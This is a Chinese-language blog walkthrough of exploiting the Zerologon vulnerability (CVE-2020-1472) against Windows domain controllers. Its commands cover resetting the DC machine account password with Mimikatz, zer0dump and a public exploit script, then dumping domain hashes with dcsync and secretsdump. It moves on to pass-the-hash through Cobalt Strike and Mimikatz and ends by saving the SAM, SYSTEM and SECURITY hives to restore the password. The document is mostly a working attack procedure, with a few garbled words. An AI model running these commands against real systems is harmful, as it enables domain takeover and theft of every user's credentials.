# CVE-2020-1472 Zerologon - Zh1z3ven - 博客园

> 原文：[`www.cnblogs.com/CoLo/p/14624772.html`](https://www.cnblogs.com/CoLo/p/14624772.html)

# CVE-2020-1472 Zerologon

# 漏洞简介

CVE-2020-1472 是继 MS17010 之后一个比较好用的内网提权漏洞，影响 Windows Server 2008R 2 至 Windows Server 2019 的多个版本系统，只要攻击者能访问到目标域控井且知道域控计算机名即可利用该漏洞.该漏洞不要求当前计算机在域内，也不要求当前计算机操作系统为 windows，该漏洞的稳定利用方式为重置目标域控的密码， 然后利用城控凭证进行 Dc sync 获取域管权限后修复域控密码，之所以不直接使用坏控凭证远程执行命令，是因为城控账户是不可以登录的，但是域控具备 Dc sync 权限， 可以获取域内任意用户的凭证。

漏洞利用过程中会重置域控存储在域中(ntds.dit)的凭证，而域控存储在域中的凭证与本地的注册表/lsass 中的凭证不一致时，会导致目标域控脱域，所以在重置完域控凭证后要尽快恢复。

# 利用过程

## 0x01 置空密码

### Mimikatz（推荐）

管理员权限运行`Mimikatz`

```
# 提升权限
privilege::debug

# 检测是否存在漏洞
lsadump::zerologon /target:<dc-ip> /account:<主机名>$

# 重置密码
lsadump::zerologon /target:<dc-ip> /account:<主机名>$ /exploit

# 导出域管 hash
lsadump::dcsync /domain:<domain> /dc:<DC server> /user:<想要导出 hash 的 user，如：administrator> /authuser:<计算机名>$ /authdomain:<domain> /authpassword:"" /authntlm
例如：
lsadump::dcsync /domain:de1ay.com /dc:dc.de1ay.com /user:krbtgt /authuser:DC$ /authdomain:de1ay /authpassword:"" /authntlm 
```

### Zer0dump

这个工具好在会直接利用会返回域管的 hash，更快速一点，不过需要新版`impacket`比较麻烦。

原文：[`blog.zsec.uk/zerologon-attacking-defending/`](https://blog.zsec.uk/zerologon-attacking-defending/)

工具链接：[`github.com/bb00/zer0dump`](https://github.com/bb00/zer0dump)

```
git clone https://github.com/bb00/zer0dump.git
cd zer0dump-master && pip3 install -r requirements.txt 
```

每攻击 256 次会有一次起作用，但还要排除 0.04%的虚假利用情况，所以会最大尝试 2000 次保证成功，当返回值为 0 时代表利用成功。这会导致 `account's password` 变为空字符串进而利用`PTH`等方法进一步操作。

利用：执行成功后会返回管理员用户的账号和 hash

```
python3 zer0dump.py <target-ip> 
```

```
"该漏洞利用程序将域中的 NTDS.dit（保留了该域上所有用户的所有 NTLM 哈希值）/tmp/dumped.tmp.ntds 转储到域，并利用秘密转储来转出本地管理员密码，如上所示。此外，由于返回的错误代码为零，因此我们可以看到该漏洞利用成功。管理员的哈希值已设置为空白字符串" 
```

排坑：

0x01 报错：`AttributeError: module ‘impacket.dcerpc.v5.nrpc’ has no attribute ‘NetrServerPasswordSet2 ’`

解决：重新安装最新版本的 impacket

```
git clone https://github.com/SecureAuthCorp/impacketcd
cd impacket
pip install . 
```

### cve-2020-1472-exploit.py

链接：[`github.com/VoidSec/CVE-2020-1472`](https://github.com/VoidSec/CVE-2020-1472)

```
python3 cve-2020-1472-exploit.py <主机名> 192.168.159.149
# 主机名也就是扫出的机器名称，对应的会有一个主机名$账户 
```

## 0x02 导出 hash

### secretsdump.py

```
python3 secretsdump.py <domain>/<主机名>\$@<dc-ip>  -no-pass
proxychains python3 secretsdump.py <domain>/<主机名>\$@<dc-ip>  -no-pass > hashes.txt 
```

## 0x03 PTH of CobaltStrike

当知道`target ip` 、账户和 账户 hash 且有一台内网的机器权限时如何快速上线。

当然这里也可以用自己喜欢的方式。

前提

有一台可通`target ip`的 cs 上线机器

已知`target ip`的账户和 hash

首先 `Add`一个监听器，`Name`随意， `TCP Beacon`

![image-20210406173756038](img/b6eceafb3c8d125135d326a2d6625ac2.png)

`view --> targets --> Add` 添加目标

![image-20210406173914785](img/b896aa56602e20d2a254baa2c3be2588.png)

完成后在`targets`标签页里，或点击![image-20210406174018598](img/ec05d33594b1abaef151a8424d4895e2.png) 选择刚才添加的`target` ，`右键 --> Jump --> psexec_psh`

![image-20210406174139476](img/105c98481aa25667d22e32d8742d2fc7.png)

填写相应`user`，该`user`的`password hash` ，所在`Domain`，`Listener`选择刚才添加的 `TCP Beacon`，`Session`选择可访问此`targe`t 的内网 cs 上线的机器，点击`Launch`就上线了。

![image-20210406174235434](img/317db9cfb934fdc888b366b3420930ba.png)

这个新生成的会话会带用下图红框标注的标记，这代表是从之前内网 cs 上线的机器的`Session`派生出的新`Session`，当内网的机器 cs 掉了这个会话也就掉了

![image-20210406174609335](img/4e739c0507d472439042b25b371047e0.png)

## 0x03 PTH of Mimikatz

```
privilege::debug

sekurlsa::pth /user:administrator /domain:<domain> /rc4:<NTLM hash>

之后会弹出一个 cmd 
```

## 0x04 恢复 hash

这里因为之前通过 NetLogon 将账号 hash 置为空，后续获得域管 hash 后需要赶紧将之前在 SAM 文件保存的 hash 去恢复，否则会脱域。

### 导出 SAM

保存 `sam.save 、security.save 、 system.save`

```
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save

# 获取文件路径
get system.saveget sam.save
get security.save 

# 删除文件
del /f system.save
del /f sam.save
del /f security.save 
```

### 获取原来的 NTLM Hash

```
python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL 
```

通过拿到 $MACHINE.ACC: 的值，然后进行恢复：注意只有后半部分：

![image-20210406183523222](img/4766c5d5a9b085f7259690aa9931af63.png)

### 恢复 Hash

```
python3 reinstall_original_pw.py Motoo-DCSRV 192.168.159.149 ce7b34c0f2c72d6cb03123ef5ff741ca 
```

### 验证恢复结果

```
python3 secretsdump.py Motoo.nc/Motoo-DCSRV$@192.168.159.149 -just-dc-no-pass

python3 secretsdump.py Motoo.nc/Motoo-DCSRV$@192.168.159.149    -no-pass   # 四个空格 
```

![image-20210406183747067](img/2c4a1cc34c1c8bcd8692a860356ffc2a.png)

## 0x05 小 Tips

如何寻找域控计算机名？

```
# 不在域内
nbtscan 扫描
nmap smb 嗅探
nslookup <域控 ip>  有时 dns 服务器也搭在域控上

# 在域内 
命令查询 
```

# 参考文章

[`cloud.tencent.com/developer/article/1780108`](https://cloud.tencent.com/developer/article/1780108)

[`github.com/VoidSec/CVE-2020-1472`](https://github.com/VoidSec/CVE-2020-1472)

[`github.com/bb00/zer0dump`](https://github.com/bb00/zer0dump)

[`blog.zsec.uk/zerologon-attacking-defending/`](https://blog.zsec.uk/zerologon-attacking-defending/)

[`cloud.tencent.com/developer/article/1753595`](https://cloud.tencent.com/developer/article/1753595)